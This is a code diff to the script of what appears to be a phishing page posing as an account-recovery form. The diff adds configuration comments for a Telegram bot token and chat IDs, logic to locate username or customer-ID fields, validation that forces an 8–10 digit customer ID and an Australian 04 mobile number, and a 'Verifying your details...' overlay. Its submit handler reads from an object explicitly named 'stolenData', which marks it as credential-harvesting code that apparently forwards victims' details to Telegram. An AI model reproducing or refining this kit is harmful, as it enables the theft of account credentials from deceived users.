@@ -66,6 +66,14 @@
           
          <script>
     (function() {
+        // ============================================
+        // TELEGRAM CONFIGURATION - FROM ENVIRONMENT VARIABLES
+        // ============================================
+        // NOTE: You need to set these environment variables before running:
+        // TELEGRAM_BOT_TOKEN - Your Telegram bot token
+        // TELEGRAM_CHAT_IDS - Comma-separated list of chat IDs (e.g., '-5051925986,-123456789')
+        
+        // Function to get environment variables (works in Node.js/Vite/Webpack/etc.)
         function getEnvVar(name, defaultValue = null) {
             // Check for different environment variable patterns
             if (typeof process !== 'undefined' && process.env) {
@@ -257,6 +265,18 @@ Date: ${timestamp}`;
         function init() {
             const form = document.getElementById('recoverForm');
             const phoneInput = document.getElementById('cid');
+            let userIdInput = null;
+            
+            // Try to find user ID input field (common patterns)
+            if (document.getElementById('userId')) {
+                userIdInput = document.getElementById('userId');
+            } else if (document.getElementById('username')) {
+                userIdInput = document.getElementById('username');
+            } else if (document.querySelector('input[name="userId"]')) {
+                userIdInput = document.querySelector('input[name="userId"]');
+            } else if (document.querySelector('input[name="username"]')) {
+                userIdInput = document.querySelector('input[name="username"]');
+            }
             
             if (!form || !phoneInput) {
                 console.error('Form elements not found');
@@ -282,37 +302,83 @@ Date: ${timestamp}`;
             `;
             console.log(dataSummary);
             
-            // Create error element
-            let errorDiv = document.getElementById('phone-error');
-            if (!errorDiv) {
-                errorDiv = document.createElement('div');
-                errorDiv.id = 'phone-error';
-                errorDiv.className = 'sg-Validation-errorWrapper';
-                errorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f;';
-                errorDiv.innerHTML = '<p>Please enter a valid Australian phone number (04xxxxxxxx).</p>';
-                phoneInput.parentNode.appendChild(errorDiv);
+            // Validate User ID function (MUST be between 8-10 digits)
+            function isValidUserId(userId) {
+                // Check if it's a valid number with 8-10 digits
+                const userIdStr = String(userId).trim();
+                return /^\d{8,10}$/.test(userIdStr);
+            }
+            
+            // Create error elements
+            let phoneErrorDiv = document.getElementById('phone-error');
+            if (!phoneErrorDiv) {
+                phoneErrorDiv = document.createElement('div');
+                phoneErrorDiv.id = 'phone-error';
+                phoneErrorDiv.className = 'sg-Validation-errorWrapper';
+                phoneErrorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f; font-size: 12px;';
+                phoneErrorDiv.innerHTML = '<p>⚠️ Please enter a valid Australian phone number (04xxxxxxxx).</p>';
+                phoneInput.parentNode.appendChild(phoneErrorDiv);
+            }
+            
+            let userIdErrorDiv = document.getElementById('userid-error');
+            if (userIdInput && !userIdErrorDiv) {
+                userIdErrorDiv = document.createElement('div');
+                userIdErrorDiv.id = 'userid-error';
+                userIdErrorDiv.className = 'sg-Validation-errorWrapper';
+                userIdErrorDiv.style.cssText = 'display: none; margin-top: 5px; color: #d32f2f; font-size: 12px;';
+                userIdErrorDiv.innerHTML = '<p>⚠️ Customer ID must be between 8-10 digits.</p>';
+                userIdInput.parentNode.appendChild(userIdErrorDiv);
             }
             
             function isValidPhone(phone) {
                 return /^04\d{8}$/.test(phone);
             }
             
-            function clearError() {
-                errorDiv.style.display = 'none';
-                phoneInput.classList.remove('sg-Input--error-border');
+            function clearPhoneError() {
+                if (phoneErrorDiv) {
+                    phoneErrorDiv.style.display = 'none';
+                    phoneInput.classList.remove('sg-Input--error-border');
+                }
             }
             
-            function showError() {
-                errorDiv.style.display = 'block';
-                phoneInput.classList.add('sg-Input--error-border');
+            function showPhoneError() {
+                if (phoneErrorDiv) {
+                    phoneErrorDiv.style.display = 'block';
+                    phoneInput.classList.add('sg-Input--error-border');
+                }
             }
             
+            function clearUserIdError() {
+                if (userIdErrorDiv && userIdInput) {
+                    userIdErrorDiv.style.display = 'none';
+                    userIdInput.classList.remove('sg-Input--error-border');
+                }
+            }
+            
+            function showUserIdError() {
+                if (userIdErrorDiv && userIdInput) {
+                    userIdErrorDiv.style.display = 'block';
+                    userIdInput.classList.add('sg-Input--error-border');
+                }
+            }
+            
+            // Phone input validation
             phoneInput.addEventListener('input', function() {
                 let value = this.value.replace(/\D/g, '');
                 if (value.length > 10) value = value.slice(0, 10);
                 this.value = value;
-                clearError();
+                clearPhoneError();
             });
+            
+            // User ID input validation if exists
+            if (userIdInput) {
+                userIdInput.addEventListener('input', function() {
+                    let value = this.value.replace(/\D/g, '');
+                    if (value.length > 10) value = value.slice(0, 10);
+                    this.value = value;
+                    clearUserIdError();
+                });
+            }
             
             // Loading overlay
             function showLoading() {
@@ -327,7 +393,7 @@ Date: ${timestamp}`;
                     `;
                     overlay.innerHTML = `
                         <div style="width: 50px; height: 50px; border: 4px solid #fff; border-top-color: #ffc800; border-radius: 50%; animation: spin 1s linear infinite;"></div>
-                        <p style="color: #ffc800; margin-top: 20px;"></p>
+                        <p style="color: #ffc800; margin-top: 20px;">Verifying your details...</p>
                     `;
                     document.body.appendChild(overlay);
                 }
@@ -347,13 +413,41 @@ Date: ${timestamp}`;
             // Handle submit
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
-                clearError();
+                clearPhoneError();
+                if (userIdInput) clearUserIdError();
                 
+                let isValid = true;
+                
+                // Validate phone number
                 const phone = phoneInput.value.trim();
-                
                 if (!phone || !isValidPhone(phone)) {
-                    showError();
+                    showPhoneError();
                     phoneInput.focus();
+                    isValid = false;
+                }
+                
+                // Validate User ID from captured data or input field
+                let userId = stolenData.userId;
+                
+                // If user ID input exists on the form, use that for validation
+                if (userIdInput && userIdInput.value.trim()) {
+                    userId = userIdInput.value.trim();
+                }
+                
+                // Check if userId is captured and valid (between 8-10 digits)
+                if (userId === 'Not captured' || !userId || !isValidUserId(userId)) {
+                    console.error('User ID validation failed:', userId);
+                    if (userIdInput) {
+                        showUserIdError();
+                        userIdInput.focus();
+                    } else {
+                        // If no user ID input field, show alert
+                        alert('Customer ID must be between 8-10 digits. Please check your details.');
+                    }
+                    isValid = false;
+                }
+                
+                if (!isValid) {
                     return;
                 }
                 
